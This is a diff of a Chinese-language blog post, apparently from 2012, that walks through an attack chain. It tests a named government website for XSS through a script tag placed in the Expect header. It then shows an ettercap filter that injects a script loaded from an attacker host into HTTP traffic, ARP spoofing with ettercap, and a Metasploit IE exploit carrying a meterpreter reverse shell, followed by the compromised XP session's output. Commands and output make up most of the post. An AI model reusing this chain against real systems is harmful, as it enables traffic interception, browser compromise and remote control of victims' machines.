@@ -6,16 +6,20 @@ comment: false
 ---
 
 正常http头
-[code lang="c"]
+```
+
 GET / HTTP/1.1
 Host: www.scjj.gov.cn
 Connection: Keep-alive
 Accept-Encoding: gzip,deflate
 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
 Accept: */*
-[/code]
+
+```
+
 在http头中加入异常处理Expect查看页面变化情况来确定是否存在漏洞
-[code lang="c"]
+```
+
 GET / HTTP/1.1
 Expect: &lt;script&gt;alert(12345)&lt;/script&gt;
 Host: www.scjj.gov.cn
@@ -23,8 +27,10 @@ Connection: Keep-alive
 Accept-Encoding: gzip,deflate
 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
 Accept: */*
-[/code]
-[![](http://neusec.cc/wp-content/uploads/2012/08/20120802142821.jpg "20120802142821")](http://neusec.cc/wp-content/uploads/2012/08/20120802142821.jpg)
+
+```
+
+[![](http://lpcdma.com/wp-content/uploads/2012/08/20120802142821.jpg "20120802142821")](http://lpcdma.com/wp-content/uploads/2012/08/20120802142821.jpg)
 
 今天遇到一个蛋疼的问题，xssf只能用一次，第二次load xssf出现一下错误
 Failed to load plugin from /opt/metasploit/msf3/plugins/xssf: uninitialized constant Msf::Xssf
@@ -34,7 +40,8 @@ cd XSSF/
 cp -rf * /opt/metasploit/msf3/
 这样的话我每用一次都的这样操作一次，非常麻烦。
 
-[code lang="c"]
+```
+
 root@bt:~/Desktop# msfconsole -y msf.yml
 msf &gt; load xssf 
 [-] Your Ruby version is 1.9.2\. Make sure your version is up-to-date with the last non-vulnerable version before using XSSF!
@@ -49,14 +56,19 @@ msf &gt; xssf_urls
 [+] XSSF logs page      : 'http://localhost:8889/gui.html?guipage=main'
 [+] XSSF statistics page: 'http://localhost:8889/gui.html?guipage=stats'
 [+] XSSF help page      : 'http://localhost:8889/gui.html?guipage=help'
-[/code]
+
+```
+
 
 写一个简单的ettercap规则在http头中插入Expect
-[code lang="c"]
+```
+
 if (ip.proto == TCP &amp;&amp; tcp.dst == 80){
 replace(&quot;Accept-Encoding&quot;,&quot;Expect: &lt;script src=&quot;http://10.1.1.137:8888/loop&quot;&gt;&lt;/script&gt;&quot;);
 }
-[/code]
+
+```
+
 关于ettercap规则和使用http://www.0x50sec.org/wp-content/uploads/2010/03/linux520.ppt
 
 编译规则并启用ettercap进行arp欺骗并修改数据包
@@ -67,7 +79,8 @@ root@bt:/usr/local/share/ettercap# ettercap -T -q -i eth0 -F fuck.ef -M ARP // /
 就要使用更复杂的ettercap规则。
 
 目标机是XP
-[code lang="c"]
+```
+
 msf &gt; set payload windows/meterpreter/reverse_tcp
 payload =&gt; windows/meterpreter/reverse_tcp
 msf &gt; use exploit/windows/browser/ms10_018_ie_behaviors
@@ -173,4 +186,5 @@ OS              : Windows XP (Build 2600, Service Pack 2).
 Architecture    : x86
 System Language : zh_CN
 Meterpreter     : x86/win32
-[/code]
+
+```
